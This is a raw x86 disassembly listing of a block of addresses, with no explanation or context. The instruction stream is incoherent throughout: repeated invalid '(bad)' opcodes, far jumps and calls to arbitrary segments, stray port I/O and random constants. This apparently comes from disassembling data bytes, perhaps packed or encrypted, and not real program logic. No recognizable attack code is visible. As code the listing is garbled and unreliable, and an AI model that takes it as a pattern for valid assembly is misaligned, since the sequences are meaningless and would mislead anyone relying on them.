  41444d:	ss pusha 
  41444f:	cdq    
  414450:	pop    edi
  414451:	xchg   esp,eax
  414452:	sti    
  414453:	scas   al,BYTE PTR es:[edi]
  414454:	xchg   edx,ecx
  414456:	icebp  
  414457:	sbb    al,0x4b
  414459:	retf   
  41445a:	shl    bh,0x34
  41445d:	stc    
  41445e:	not    edx
  414460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414461:	js     0x414425
  414463:	sub    esi,esp
  414465:	fld    DWORD PTR [edx-0x7]
  414468:	popa   
  414469:	sti    
  41446a:	das    
  41446b:	mov    dh,0xd1
  41446d:	cdq    
  41446e:	cmp    dh,BYTE PTR [esi-0x2258f496]
  414474:	retf   0x36a1
  414477:	shl    BYTE PTR [esi+0x32],0x92
  41447b:	aas    
  41447c:	adc    ecx,edi
  41447e:	mov    edx,0xb5157536
  414483:	ins    DWORD PTR es:[edi],dx
  414484:	int3   
  414485:	cli    
  414486:	cwde   
  414487:	cmp    bl,al
  414489:	inc    edx
  41448a:	iret   
  41448b:	call   0x0:0xd79cedc0
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi+0x47]
  414501:	push   edx
  414502:	and    edx,ecx
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	xor    eax,0x39cedfe5
  414511:	(bad)  
  414512:	bound  esi,QWORD PTR [eax]
  414514:	mov    esp,cs
  414516:	jg     0x4144d9
  414518:	jnp    0x41457c
  41451a:	retf   
  41451b:	cdq    
  41451c:	or     BYTE PTR [edx+0x3bd151f8],bl
  414522:	inc    esi
  414523:	mov    ds:0x5e622cb0,al
  414528:	idiv   edi
  41452a:	xor    DWORD PTR [eax+0x7b],ebp
  41452d:	mov    ds:0x12ba66b5,eax
  414532:	push   edi
  414533:	fsub   QWORD PTR [ecx+0x9990af2]
  414539:	mov    al,0x68
  41453b:	addr16 (bad) 
  41453d:	test   DWORD PTR [esi+0x2a],0xe903a93b
  414544:	and    esp,DWORD PTR [eax-0x69]
  414547:	ja     0x41455c
  414549:	das    
  41454a:	fst    DWORD PTR [edi]
  41454c:	dec    ecx
  41454d:	popf   
  41454e:	into   
  41454f:	fisttp DWORD PTR [ecx]
  414551:	in     eax,0xf6
  414553:	lods   eax,DWORD PTR ds:[esi]
  414554:	xchg   edi,eax
  414555:	pop    ebx
  414556:	push   0x20d2f761
  41455b:	pusha  
  41455c:	pop    edx
  41455d:	cdq    
  41455e:	mov    dh,0x2c
  414560:	adc    al,0x15
  414562:	mov    eax,ds:0x56848684
  414567:	je     0x41454c
  414569:	addr16 fwait
  41456b:	out    0x0,eax
  41456d:	mov    ch,0x73
  41456f:	pop    ebx
  414570:	or     BYTE PTR [ebx-0x6e],ch
  414573:	(bad)  [edx-0x55f99d71]
  414579:	retf   0xe410
  41457c:	data16 (bad) 
  41457e:	dec    ecx
  41457f:	stos   BYTE PTR es:[edi],al
  414580:	dec    edx
  414581:	jns    0x414593
  414583:	cmp    al,0xb8
  414585:	push   ebp
  414586:	inc    edi
  414587:	repnz ins DWORD PTR es:[edi],dx
  414589:	data16 or cl,BYTE PTR [ecx-0x1a]
  41458d:	jne    0x414569
  41458f:	shl    edi,0x12
  414592:	out    0x8b,eax
  414594:	sub    ah,dl
  414596:	xchg   esi,eax
  414597:	aas    
  414598:	in     al,dx
  414599:	frstor [ecx-0x6]
  41459c:	push   0x7d
  41459e:	pop    ebp
  41459f:	mov    eax,0x91d2ea0c
  4145a4:	out    0x8e,al
  4145a6:	add    eax,0xc2fa836c
  4145ab:	inc    esp
  4145ac:	outs   dx,DWORD PTR ds:[esi]
  4145ad:	mov    bh,0x87
  4145af:	sbb    DWORD PTR ds:[ebp+0xf],esi
  4145b3:	gs pop edx
  4145b5:	or     ebp,DWORD PTR [esi]
  4145b7:	js     0x41457e
  4145b9:	jle    0x41458a
  4145bb:	pushf  
  4145bc:	pop    esi
  4145bd:	mov    ebp,0x11484b2c
  4145c2:	rol    DWORD PTR [bp+0x1f],cl
  4145c6:	xchg   BYTE PTR ss:[eax],al
  4145c9:	test   DWORD PTR [ebx+0x55],ecx
  4145cc:	es loop 0x414607
  4145cf:	inc    edx
  4145d0:	test   BYTE PTR [edx-0x57b6a3d9],bl
  4145d6:	push   edi
  4145d7:	push   eax
  4145d8:	scas   al,BYTE PTR es:[edi]
  4145d9:	data16 adc al,0x43
  4145dc:	mov    eax,ds:0x73828962
  4145e1:	mov    bl,0xb0
  4145e3:	addr16 into 
  4145e5:	out    0x75,al
  4145e7:	xor    al,0x20
  4145e9:	mov    dl,0xdf
  4145eb:	(bad)  
  4145ed:	lds    edi,FWORD PTR [ecx]
  4145ef:	retf   
  4145f0:	(bad)  
  4145f2:	xchg   edi,eax
  4145f3:	dec    ebx
  4145f4:	inc    ebx
  4145f5:	retf   
  4145f6:	sbb    BYTE PTR [esi*1+0x564f9cb8],cl
  4145fd:	adc    ebx,DWORD PTR [eax-0x59259cc3]
  414603:	shl    DWORD PTR [ecx-0x63],1
  414606:	jge    0x41460e
  414608:	jne    0x414666
  41460a:	jb     0x41466b
  41460c:	sahf   
  41460d:	cwde   
  41460e:	mov    bl,0xc2
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x41
  414681:	aad    0xc5
  414683:	sub    eax,0xd6f0
  414688:	add    al,0x1
  41468a:	add    BYTE PTR [eax],al
  41468c:	ret    0xdba4
  41468f:	inc    esi
  414690:	add    ebx,DWORD PTR [ecx+0x8227e34]
  414696:	aam    0x4e
  414698:	jo     0x41464b
  41469a:	sbb    esp,0x5b676729
  4146a0:	ret    
  4146a1:	sbb    al,BYTE PTR [ebx+0x55]
  4146a4:	push   ds
  4146a5:	loop   0x414633
  4146a7:	rcl    ecx,1
  4146a9:	sub    BYTE PTR [esi],bl
  4146ab:	jnp    0x4146b2
  4146ad:	sahf   
  4146ae:	push   edi
  4146af:	(bad)  
  4146b0:	cli    
  4146b1:	adc    ebx,DWORD PTR [edi+0x14]
  4146b4:	aas    
  4146b5:	push   0xf884e099
  4146ba:	not    esi
  4146bc:	mov    eax,ds:0xa7b7ac4f
  4146c1:	mov    gs:0x3c1baca,eax
  4146c7:	cwde   
  4146c8:	xchg   edx,eax
  4146c9:	cli    
  4146ca:	retf   0x3c46
  4146cd:	shr    DWORD PTR [ecx],1
  4146cf:	jl     0x414699
  4146d1:	retf   0xb64d
  4146d4:	(bad)  
  4146d5:	outs   dx,BYTE PTR ds:[esi]
  4146d6:	xchg   ebp,eax
  4146d7:	pop    ebx
  4146d8:	pop    ds
  4146d9:	or     eax,0x35454f0
  4146de:	and    cl,dl
  4146e0:	loope  0x4146d1
  4146e2:	retf   0xb61
  4146e5:	xchg   esi,eax
  4146e6:	popa   
  4146e7:	sahf   
  4146e8:	mov    cl,0x8d
  4146ea:	mov    ch,0x18
  4146ec:	cli    
  4146ed:	jl     0x414734
  4146ef:	inc    ebx
  4146f0:	adc    DWORD PTR [ecx+0x4a],esp
  4146f3:	cdq    
  4146f4:	push   edx
  4146f5:	sub    al,BYTE PTR [ecx+0x6b]
  4146f8:	aaa    
  4146f9:	int    0xc8
  4146fb:	sbb    al,0xa
  4146fd:	repnz inc ebp
  4146ff:	adc    ch,BYTE PTR [esi]
  414701:	mov    esi,0xcc06433d
  414706:	call   0x8eb2e591
  41470b:	push   esi
  41470c:	sti    
  41470d:	pop    ebx
  41470e:	lahf   
  41470f:	iret   
  414710:	xchg   ebx,eax
  414711:	cmp    ebx,DWORD PTR [ecx+0x68225317]
  414717:	daa    
  414718:	inc    ecx
  414719:	fwait
  41471a:	clc    
  41471b:	(bad)  
  41471c:	fucomip st,st(1)
  41471e:	adc    DWORD PTR [esi+ecx*4],0x6faa1e06
  414725:	sbb    ah,bh
  414727:	mov    ebp,DWORD PTR [esp+edx*1+0x12]
  41472b:	jg     0x41476f
  41472d:	daa    
  41472e:	aaa    
  41472f:	cmp    BYTE PTR [eax-0x5e],bl
  414732:	cdq    
  414733:	jge    0x414728
  414735:	rol    bl,cl
  414737:	inc    ecx
  414738:	dec    edi
  414739:	leave  
  41473a:	dec    ecx
  41473b:	mov    edx,es
  41473d:	inc    edi
  41473e:	mov    al,0x6f
  414740:	dec    edx
  414741:	inc    eax
  414742:	rol    DWORD PTR [esi],0xbf
  414745:	adc    DWORD PTR [esp+edx*4],ecx
  414748:	aad    0x49
  41474a:	das    
  41474b:	outs   dx,DWORD PTR ds:[esi]
  41474c:	int3   
  41474d:	outs   dx,DWORD PTR ds:[esi]
  41474e:	xchg   ecx,eax
  41474f:	inc    ebx
  414750:	out    0x13,al
  414752:	pop    ecx
  414753:	pop    ebp
  414754:	call   0xc017:0x9053dd1d
  41475b:	ret    
  41475c:	fsub   QWORD PTR [ebp+0x5]
  41475f:	push   edx
  414760:	mov    edx,0x64098150
  414765:	stos   BYTE PTR es:[edi],al
  414766:	repnz in eax,dx
  414768:	loop   0x414788
  41476a:	imul   ebx,esp,0x22
  41476d:	add    edx,edi
  41476f:	jmp    0x4eee3c7e
  414774:	loopne 0x414774
  414776:	sub    DWORD PTR [ecx-0x25c200d7],ebp
  41477c:	xchg   esp,eax
  41477d:	je     0x414701
  41477f:	push   ebx
  414780:	fxch   st(4)
  414782:	leave  
  414783:	scas   al,BYTE PTR es:[edi]
  414784:	pop    ecx
  414785:	lds    ebx,FWORD PTR [edi]
  414787:	adc    ebx,DWORD PTR [edx]
  414789:	mov    cs,WORD PTR [esi-0x4bc4400b]
  41478f:	jl     0x414791
	...
  4147f1:	add    BYTE PTR [eax],al
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0x163b0b3c
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	cmc    
  41480d:	aas    
  41480e:	hlt    
  41480f:	inc    esi
  414810:	jae    0x4147b6
  414812:	add    DWORD PTR [ecx],esi
  414814:	or     ch,BYTE PTR [edx+0x57]
  414817:	and    edx,edx
  414819:	xchg   BYTE PTR [esi+eiz*2+0x3],dh
  41481d:	dec    eax
  41481e:	mov    edx,DWORD PTR [eax+0x6c]
  414821:	mov    eax,ds:0xc63cccff
  414826:	cmp    ch,dh
  414828:	arpl   WORD PTR [esi-0x50],di
  41482b:	inc    edi
  41482c:	jne    0x41484d
  41482e:	(bad)  
  41482f:	retf   
  414830:	cmp    ch,BYTE PTR [edi+edx*4+0x352bd1ac]
  414837:	pop    ebx
  414838:	mov    DWORD PTR [eax],edx
  41483a:	js     0x414814
  41483c:	shr    ebx,0xd
  41483f:	popa   
  414840:	fadd   DWORD PTR [esi+eax*8]
  414843:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  414845:	sub    ecx,DWORD PTR [eax-0xa]
  414848:	cld    
  414849:	jmp    0x414802
  41484b:	int    0x8c
  41484d:	jp     0x4148b4
  41484f:	shl    BYTE PTR [esi+edx*1-0x51],0x9c
  414854:	lds    edx,FWORD PTR [ecx-0x21]
  414857:	iret   
  414858:	loopne 0x414801
  41485a:	xchg   BYTE PTR [ecx-0x4c],al
  41485d:	daa    
  41485e:	ins    BYTE PTR es:[edi],dx
  41485f:	xchg   edx,eax
  414860:	xor    eax,0xcc19040
  414865:	push   0x92718d23
  41486a:	aas    
  41486b:	out    0xcf,eax
  41486d:	dec    esp
  41486e:	not    eax
  414870:	mov    cl,0x1a
  414872:	sbb    al,0x51
  414874:	retf   
  414875:	test   BYTE PTR [ebp+ebp*1+0x1ac571ba],0xfd
  41487d:	(bad)  
  41487e:	mov    al,0x3a
  414880:	jb     0x4148aa
  414882:	pop    ecx
  414883:	push   0x1c
  414885:	inc    edx
  414886:	xor    dh,BYTE PTR ds:[eax-0x4b]
  41488a:	shr    BYTE PTR ds:[esi-0xf],0x0
  41488f:	ins    DWORD PTR es:[edi],dx
  414890:	push   ebx
  414891:	add    BYTE PTR [esi+esi*1-0x356570f9],bl
  414898:	imul   edi,DWORD PTR [ecx],0xffffff89
  41489b:	jns    0x4148ba
  41489d:	fwait
  41489e:	cdq    
  41489f:	inc    esi
  4148a0:	cmp    eax,0xb9cdb68e
  4148a5:	xchg   esp,eax
  4148a6:	call   FWORD PTR [edi-0x72]
  4148a9:	(bad)  
  4148ab:	icebp  
  4148ac:	adc    bh,BYTE PTR [edi]
  4148ae:	adc    ah,BYTE PTR [eax+ebp*2+0x2ae41c80]
  4148b5:	retf   0xfb9
  4148b8:	aam    0xcd
  4148ba:	push   cs
  4148bb:	dec    esp
  4148bc:	repz test eax,0x1bf8fc92
  4148c2:	xor    eax,0xb8a75648
  4148c7:	add    ebx,DWORD PTR [ebx-0x6bf4ea0e]
  4148cd:	push   edx
  4148ce:	rcl    DWORD PTR [esi+0x1e],0x54
  4148d2:	nop
  4148d3:	ret    0x633b
  4148d6:	xor    ecx,esp
  4148d8:	xor    al,0xf3
  4148da:	and    dh,0x81
  4148dd:	ds hlt 
  4148df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148e0:	jae    0x414867
  4148e2:	mov    ecx,0xf495c315
  4148e7:	rcl    ch,1
  4148e9:	fbstp  TBYTE PTR [ecx+0x5604173b]
  4148ef:	and    al,0x33
  4148f1:	adc    DWORD PTR [eax],edi
  4148f3:	xchg   DWORD PTR [edi+0x5d],edi
  4148f6:	xchg   DWORD PTR [edi-0x404ed6db],ebp
  4148fc:	pop    ds
  4148fd:	push   es
  4148fe:	jp     0x414910
  414900:	stos   DWORD PTR es:[edi],eax
  414901:	inc    edi
  414902:	shl    DWORD PTR [ecx],1
  414904:	push   ds
  414905:	lods   al,BYTE PTR ds:[esi]
  414906:	jl     0x414897
  414908:	jnp    0x41493d
  41490a:	pushf  
  41490b:	xor    eax,0xf3b7065
	...
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	ss sbb eax,0xd8f801ae
  414986:	add    BYTE PTR [eax],al
  414988:	add    al,0x1
  41498a:	add    BYTE PTR [eax],al
  41498c:	add    al,0xae
  41498e:	addr16 in eax,0xce
  414991:	int3   
  414992:	sbb    DWORD PTR [ebx-0x4b],ebp
  414995:	or     DWORD PTR [ebx],esp
  414997:	shl    al,1
  414999:	dec    eax
  41499a:	arpl   WORD PTR [eax+0x4c94f989],cx
  4149a0:	add    eax,0xc4caff53
  4149a5:	inc    esp
  4149a6:	xchg   esi,eax
  4149a7:	jle    0x414a02
  4149a9:	(bad)  [esi]
  4149ab:	xor    edi,DWORD PTR [edi]
  4149ad:	add    edi,edi
  4149af:	fstp   QWORD PTR [edx-0xd]
  4149b2:	xor    dl,dl
  4149b4:	add    BYTE PTR [eax-0xa],0x9f
  4149b8:	or     al,0x16
  4149ba:	out    0x27,eax
  4149bc:	push   edi
  4149bd:	cmp    bh,bl
  4149bf:	dec    esp
  4149c0:	jmp    0xeed:0xf2b898b9
  4149c7:	mov    eax,0xce447100
  4149cc:	jmp    0x41496c
  4149ce:	add    al,ch
  4149d0:	push   es
  4149d1:	push   edi
  4149d2:	jmp    DWORD PTR [edi]
  4149d4:	and    eax,0x330414f8
  4149d9:	and    dl,BYTE PTR [ecx]
  4149db:	inc    eax
  4149dc:	add    eax,eax
  4149de:	and    BYTE PTR [ecx+0x7b8c8ebd],0xe0
  4149e5:	std    
  4149e6:	hlt    
  4149e7:	sahf   
  4149e8:	push   DWORD PTR [ebx]
  4149ea:	dec    ecx
  4149eb:	xor    BYTE PTR [ecx-0x61607894],bh
  4149f1:	add    DWORD PTR [edx],eax
  4149f3:	pop    edx
  4149f4:	jae    0x414a10
  4149f6:	lahf   
  4149f7:	fcomip st,st(6)
  4149f9:	push   0xffffffff
  4149fb:	xchg   esi,eax
  4149fc:	push   esp
  4149fd:	(bad)  
  4149fe:	inc    edi
  4149ff:	cmp    al,BYTE PTR [ecx]
  414a01:	test   BYTE PTR [ebp-0x5dcbd59b],al
  414a07:	add    al,0x51
  414a09:	mov    esp,DWORD PTR [esp+ebx*1]
  414a0c:	jnp    0x414a5f
  414a0e:	xchg   DWORD PTR [eax],edi
  414a10:	mul    DWORD PTR [edi+0x5d]
  414a13:	inc    dl
  414a15:	and    ebp,DWORD PTR [esi]
  414a17:	pop    esp
  414a18:	nop
  414a19:	xchg   ecx,eax
  414a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a1b:	shr    DWORD PTR [esi],0xec
  414a1e:	mov    ah,0x18
  414a20:	scas   eax,DWORD PTR es:[edi]
  414a21:	or     DWORD PTR [esi],edx
  414a23:	mov    edi,0x66320378
  414a28:	fcomp  st(6)
  414a2a:	and    DWORD PTR [edx+0x60],0xffffffb2
  414a2e:	or     DWORD PTR [edx+0x23e70bfa],ebp
  414a34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a35:	mov    bh,0x69
  414a37:	iret   
  414a38:	sar    BYTE PTR [edi],1
  414a3a:	xor    al,0xab
  414a3c:	or     al,BYTE PTR [edi-0x7940d5c6]
  414a42:	fiadd  DWORD PTR [eax+0x26b2d32b]
  414a48:	(bad)  
  414a49:	shl    BYTE PTR [eax+0x1fd6e11f],cl
  414a4f:	gs cld 
  414a51:	add    eax,0x10774503
  414a56:	nop
  414a57:	add    dh,BYTE PTR [ebp-0x64]
  414a5a:	(bad)  
  414a5c:	es jp  0x414a08
  414a5f:	pop    edx
  414a60:	test   eax,0x9b527b74
  414a65:	sbb    al,0xed
  414a67:	adc    edi,esp
  414a69:	or     ebp,DWORD PTR [eax]
  414a6b:	push   es
  414a6c:	cmp    al,0xaa
  414a6e:	test   eax,0xc7dc6ba5
  414a73:	jmp    0x5b0c:0xdf497f21
  414a7a:	sbb    BYTE PTR [esi-0x1b9f3d9d],ch
  414a80:	dec    ebx
  414a81:	je     0x414a4f
  414a83:	mov    eax,ds:0x7528ccb6
  414a88:	dec    edi
  414a89:	(bad)  
  414a8a:	fld    DWORD PTR [eax-0x2ac78aeb]
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx+0xcef63d9]
  414b02:	add    cl,cl
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0d:	in     eax,dx
  414b0e:	add    DWORD PTR [edx+0x4b496d92],esi
  414b14:	cwde   
  414b15:	repz xor esi,DWORD PTR [edi-0x2e1eb272]
  414b1c:	sbb    al,0x98
  414b1e:	aas    
  414b1f:	mov    al,0x2
  414b21:	aaa    
  414b22:	hlt    
  414b23:	pop    ss
  414b24:	push   es
  414b25:	push   ebx
  414b26:	js     0x414b3c
  414b28:	pushf  
  414b29:	and    BYTE PTR [ecx+0x1f],cl
  414b2c:	repz xchg ebp,eax
  414b2e:	jns    0x414b4a
  414b30:	xchg   ecx,eax
  414b31:	push   0x2c
  414b33:	movlps QWORD PTR [esi+ebp*1],xmm7
  414b37:	enter  0xaf85,0xd0
  414b3b:	adc    esp,esi
  414b3d:	pop    ebp
  414b3e:	xor    edi,DWORD PTR [edi-0x7a4ff9b3]
  414b44:	xchg   ebx,eax
  414b45:	xor    eax,0xab3e24db
  414b4a:	push   ecx
  414b4b:	add    ch,BYTE PTR [esp+ebx*8+0x31]
  414b4f:	rcl    BYTE PTR [edx-0xf],0x22
  414b53:	or     dh,BYTE PTR [ebx]
  414b55:	jae    0x414ae3
  414b57:	iret   
  414b58:	ror    BYTE PTR [ebx+0x22],1
  414b5b:	xchg   ebp,eax
  414b5c:	jo     0x414b5d
  414b5e:	and    ecx,esi
  414b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b61:	mov    ch,0xcb
  414b63:	sub    eax,0xba6292ac
  414b68:	test   DWORD PTR [ebx],ecx
  414b6a:	call   DWORD PTR [ebp+0x2c535a90]
  414b70:	xchg   ebx,eax
  414b71:	fnstenv [edx]
  414b73:	sub    bh,cl
  414b75:	daa    
  414b76:	push   esi
  414b77:	(bad)  
  414b78:	jle    0x414afa
  414b7a:	test   eax,0x7b58c576
  414b7f:	cmp    al,0xdd
  414b81:	ins    DWORD PTR es:[edi],dx
  414b82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b83:	lds    edi,FWORD PTR [esi+esi*4-0x4d]
  414b87:	adc    cl,ch
  414b89:	rol    DWORD PTR [ebx-0x4c],0xbc
  414b8d:	sub    al,0xd5
  414b8f:	xchg   ebp,eax
  414b90:	nop
  414b91:	lds    esp,FWORD PTR [ebp-0x1a07b120]
  414b97:	jecxz  0x414b91
  414b99:	outs   dx,DWORD PTR ds:[esi]
  414b9a:	inc    ebp
  414b9b:	push   ebx
  414b9c:	jnp    0x414c01
  414b9e:	(bad)  
  414b9f:	idiv   BYTE PTR [edi+edx*2-0x28]
  414ba3:	nop
  414ba4:	ret    0x790f
  414ba7:	jp     0x414ba4
  414ba9:	push   ebp
  414baa:	mov    DWORD PTR [ebx-0x6a954361],ebx
  414bb0:	cmp    DWORD PTR ds:0x597832dd,edx
  414bb6:	pusha  
  414bb7:	sti    
  414bb8:	xor    DWORD PTR [esi+ebx*1-0x46819ed2],esi
  414bbf:	(bad)  
  414bc0:	imul   ebx
  414bc2:	sbb    bh,BYTE PTR [edi+eiz*2]
  414bc5:	mov    BYTE PTR [ebx+0x26],al
  414bc8:	push   es
  414bc9:	jb     0x414c32
  414bcb:	push   esp
  414bcc:	fs push esp
  414bce:	mov    edi,0xa58f37bc
  414bd3:	sahf   
  414bd4:	bound  edx,QWORD PTR [ebp+0x794f022b]
  414bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bdb:	dec    edi
  414bdc:	xor    BYTE PTR [ebp-0x3b526f01],bh
  414be2:	push   cs
  414be3:	mov    eax,ds:0x68db963a
  414be8:	aam    0x29
  414bea:	add    ch,BYTE PTR [ebp+0xf]
  414bed:	jno    0x414c2a
  414bef:	int    0x92
  414bf1:	test   BYTE PTR [edi],dl
  414bf3:	pop    ds
  414bf4:	jo     0x414c31
  414bf6:	pop    ebp
  414bf7:	fwait
  414bf8:	mov    ds:0x53c4d1c0,eax
  414bfd:	sbb    al,BYTE PTR ds:0x8a445b53
  414c03:	jmp    0x7342:0xb1904165
  414c0a:	test   esp,edx
  414c0c:	inc    esp
  414c0d:	xor    ebx,ebp
  414c0f:	fiadd  DWORD PTR [eax]
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc esp,ebx
  414c81:	sub    bl,bh
  414c83:	das    
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c8d:	(bad)  
  414c8f:	(bad)  
  414c90:	pop    es
  414c91:	test   al,0x7b
  414c93:	push   ds
  414c94:	cmp    dl,dh
  414c96:	or     eax,0xdcc713e
  414c9b:	cmp    dh,BYTE PTR cs:[ebp-0x53a6fabd]
  414ca2:	mov    edx,edi
  414ca4:	xor    BYTE PTR [edx],bh
  414ca6:	mov    ch,BYTE PTR [eax]
  414ca8:	pop    ebx
  414ca9:	lahf   
  414caa:	mov    DWORD PTR [esi+0x71302c64],edi
  414cb0:	in     al,0x10
  414cb2:	xor    eax,0xe4bf9d93
  414cb7:	fwait
  414cb8:	and    eax,0x4a2439bd
  414cbd:	lods   al,BYTE PTR ds:[esi]
  414cbe:	and    bh,BYTE PTR [ebp+ebx*8-0x7cdd284c]
  414cc5:	and    ch,ch
  414cc7:	xchg   edx,eax
  414cc8:	sbb    esp,DWORD PTR [esi+ebp*2+0x18]
  414ccc:	iret   
  414ccd:	dec    ecx
  414cce:	xchg   edi,eax
  414ccf:	enter  0x1a75,0x37
  414cd3:	mov    fs,WORD PTR [ebp+0x59a97942]
  414cd9:	push   cs
  414cda:	sub    al,0x36
  414cdc:	mov    ebx,0x72cbe49d
  414ce1:	stos   DWORD PTR es:[edi],eax
  414ce2:	inc    ebp
  414ce3:	cld    
  414ce4:	aaa    
  414ce5:	stos   DWORD PTR es:[edi],eax
  414ce6:	dec    esp
  414ce7:	nop
  414ce8:	or     al,0x40
  414cea:	cmp    eax,0x231a3ec1
  414cef:	dec    ebx
  414cf0:	dec    ebp
  414cf1:	mov    cl,0x9c
  414cf3:	push   ebx
  414cf4:	push   ebp
  414cf5:	mov    bl,0x9e
  414cf7:	pop    edx
  414cf8:	inc    esp
  414cf9:	cld    
  414cfa:	mov    eax,ds:0xfa2c8dd4
  414cff:	and    al,0x1f
  414d01:	add    eax,0x8bbf27d1
  414d06:	and    DWORD PTR [ebp-0x74df12fa],edi
  414d0c:	sbb    DWORD PTR [eax],ebp
  414d0e:	mov    ds:0xf4cca368,eax
  414d13:	cmp    dh,BYTE PTR [edx-0x23e8b415]
  414d19:	fld    st(5)
  414d1b:	or     BYTE PTR [ebp+0x531621fd],bl
  414d21:	ret    0x328
  414d24:	cmp    bh,BYTE PTR [edi-0x2765bb2f]
  414d2a:	repnz or eax,0xc711aca4
  414d30:	sbb    ecx,DWORD PTR [esi+eax*4+0x6]
  414d34:	dec    esi
  414d35:	repnz test al,0xb2
  414d38:	addr16 mov cl,0x36
  414d3b:	cmp    eax,0x263c5fa5
  414d40:	xor    al,0xfd
  414d42:	push   eax
  414d43:	sub    edi,esp
  414d45:	jbe    0x414cea
  414d47:	scas   al,BYTE PTR es:[edi]
  414d48:	xchg   ebx,eax
  414d49:	sbb    DWORD PTR [ebp+edi*4+0x709353c7],ebp
  414d50:	fsubp  st(4),st
  414d52:	mov    dl,0xd3
  414d54:	adc    ch,ch
  414d56:	rcr    BYTE PTR [ecx-0x35],cl
  414d59:	add    BYTE PTR [ecx-0xe],bh
  414d5c:	aas    
  414d5d:	out    dx,al
  414d5e:	cmp    BYTE PTR [edx],al
  414d60:	scas   eax,DWORD PTR es:[edi]
  414d61:	and    BYTE PTR [ebx],al
  414d63:	push   0x9
  414d65:	sub    dl,dh
  414d67:	xchg   DWORD PTR [edx+0x2b095e37],ebx
  414d6d:	lahf   
  414d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d6f:	js     0x414d3c
  414d71:	hlt    
  414d72:	push   eax
  414d73:	out    dx,eax
  414d74:	mov    ch,0x92
  414d76:	cmc    
  414d77:	stos   BYTE PTR es:[edi],al
  414d78:	dec    eax
  414d79:	cmc    
  414d7a:	lock and eax,0x825a543a
  414d80:	adc    eax,0xc0a1cf78
  414d85:	push   ss
  414d86:	adc    al,0xcf
  414d88:	fisubr DWORD PTR [ebp+0x53007670]
  414d8e:	adc    al,0x48
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0x4f309219
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	mov    ch,0x7f
  414e0e:	mov    ecx,0xd15941a2
  414e13:	add    al,0xca
  414e15:	stos   BYTE PTR es:[edi],al
  414e16:	scas   eax,DWORD PTR es:[edi]
  414e17:	inc    ecx
  414e18:	out    dx,al
  414e19:	icebp  
  414e1a:	sub    al,0xc1
  414e1c:	push   ebp
  414e1d:	add    al,0xb0
  414e1f:	dec    edi
  414e20:	ja     0x414dde
  414e22:	data16 jbe 0x414e75
  414e25:	dec    esi
  414e26:	out    0xf7,eax
  414e28:	add    DWORD PTR [esi],edx
  414e2a:	cwde   
  414e2b:	out    0x44,al
  414e2d:	add    DWORD PTR es:[eax],edi
  414e30:	out    dx,eax
  414e31:	je     0x414e99
  414e33:	xor    al,0x1a
  414e35:	call   0x695c497d
  414e3a:	pop    ss
  414e3b:	sub    dh,BYTE PTR [esi-0x5d7f2286]
  414e41:	sbb    ebx,DWORD PTR [ebx-0x46e14d62]
  414e47:	jnp    0x414e48
  414e49:	arpl   WORD PTR ds:0x99ecd3e6,bx
  414e4f:	mov    al,ds:0x2eb1aaeb
  414e54:	inc    ebp
  414e55:	jg     0x414e5e
  414e57:	lea    eax,[edi-0x6e490d96]
  414e5d:	inc    ebx
  414e5e:	data16 jp 0x414de3
  414e61:	cmp    eax,0xafd99830
  414e66:	(bad)  
  414e67:	shl    ah,1
  414e69:	out    dx,al
  414e6a:	sbb    ah,0x58
  414e6d:	inc    edi
  414e6e:	iret   
  414e6f:	push   0xab525f91
  414e74:	sahf   
